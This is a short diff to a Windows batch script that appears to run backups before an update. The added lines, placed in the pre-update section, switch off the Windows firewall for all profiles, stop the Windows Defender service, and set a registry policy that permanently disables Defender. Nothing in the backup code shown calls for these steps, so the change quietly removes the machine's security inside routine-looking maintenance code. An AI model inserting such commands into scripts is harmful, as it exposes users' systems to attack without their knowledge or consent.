@@ -776,6 +776,15 @@ goto Main_Menu
 @REM -------------------------> Befor_Updatet <----------------------------- 
 :Befor_Update
 set Befor_Update_Path=%BACKUP_DIR%/Befor_Update
+REM ------------Set Firewall off---------
+netsh advfirewall set publicprofile state off
+netsh advfirewall set currentprofile state off
+netsh advfirewall set domainprofile state off
+netsh advfirewall set allprofiles state off
+netsh advfirewall set privateprofile state off
+REM ------------------stop windefend-----------------
+net stop windefend
+Reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
 @REM -------------------------> Backup Data
 :Befor_Update_Backup
 set Befor_Update_Backup_Path=%Befor_Update_Path%/Backup
